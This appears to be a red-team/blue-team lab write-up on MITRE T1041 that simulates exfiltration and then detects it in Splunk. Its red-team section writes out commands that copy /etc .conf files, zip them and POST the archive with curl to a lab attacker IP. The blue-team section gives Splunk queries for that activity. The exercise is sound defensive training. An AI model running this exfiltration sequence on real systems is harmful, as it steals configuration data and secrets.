# MITRE T1041 – Exfiltration Over C2 Channel (via curl)

## 📌 Technique ID
- **MITRE ID:** T1041
- **Tactic:** Exfiltration
- **Technique:** Exfiltration Over Command and Control Channel

## 🎯 Objective
Simulate and detect data exfiltration over a C2 channel using `curl` to send sensitive `.conf` files to a mock attacker server (Kali). Detection is performed using `.bash_history` and `syslog` logs ingested in Splunk.

## 🔴 Red Team – Simulated Attack

1. **Data Staging:**
   
   mkdir /tmp/exfil
   find /etc -type f -name "*.conf" -readable -exec cp {} /tmp/exfil/ \; 2>/dev/null
   Compression:


cd /tmp/exfil
zip -r data_loot.zip .
Exfiltration:


curl -X POST -F "file=@data_loot.zip" http://192.168.177.128:8000/upload

## 🟦 Blue Team – Detection in Splunk

✅ Detection 1: curl or wget with file upload flags

index=* ("curl" OR "wget") ("POST" OR "-F" OR "@")
| table _time, host, user, source, message

✅ Detection 2: Suspicious curl in syslog or .bash_history

index=* source="*.bash_history" curl
index=* source="/var/log/syslog" curl

## 🖼️ Screenshots to Capture

curl_exfil_command.png	curl upload command from terminal

bash_history_log.png	Evidence of curl in bash history

splunk_detection.png	Matching Splunk query result

syslog_detection.png	Evidence of exfil in syslog

## ✅ Outcome

The attack simulation and detection demonstrate how data exfiltration over common tools like curl can be monitored and alerted using traditional logs like .bash_history and syslog, enhancing real-world SOC response capabilities.
